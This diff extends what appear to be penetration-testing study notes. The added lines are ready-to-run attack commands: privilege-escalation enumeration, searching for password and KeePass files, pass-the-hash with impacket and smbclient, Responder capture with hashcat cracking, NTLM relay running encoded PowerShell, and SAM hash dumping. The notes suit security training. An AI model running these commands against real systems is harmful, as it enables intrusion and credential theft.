@@ -38,8 +38,13 @@ keepass2john /root/Desktop/NewDatabase.kdb > file
 john -incremental:alpha -format=keepass file
 
 **Linux Privilege Escalation**
+id
 sudo -l
+sudo -i
 uname -a
+find / -writable -type d 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+grep -Rni . -e 'password' // search for interesting string recursively in files.
 Run Linpeas
 Run pspy64
 sudo -V
@@ -75,6 +80,49 @@ Writable services binaries path
 Unquoted services
 Listening ports on localhost
 Registry keys
+
+**Situational Awareness**
+C:\> whoami /groups
+PS C:\> Get-LocalUser
+PS C:\> Get-LocalGroup
+PS C:\> Get-LocalGroupMember Administrators
+C:\> systeminfo
+C:\> ipconfig /all
+C:\> route print
+C:\> netstat -ano
+
+**Hidden in Plain View**
+PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+PS C:\> Get-Process
+PS C:\> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+PS C:\> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+PS C:\> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+C:\> net user steve
+C:\> runas /user:backupadmin cmd
+
+**Information Gathering Powershell**
+PS C:\> Get-History
+PS C:\> (Get-PSReadlineOption).HistorySavePath
+
+**Passing NTLM**
+kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
+kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+
+kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+
+**Cracking Net-NTLMv2**
+kali@kali:~$ sudo responder -I tap0  C:\> dir \\IP_Kali\test
+
+kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+
+**Relaying Net-NTLMv2**
+kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t IP_Target -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+
+when finding backup SAM and SYSTEM files in windows.old/Windows/system32
+
+kali@kali:~$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL > SAMhashes
 
 **Tunneling & Port Forwarding**
 
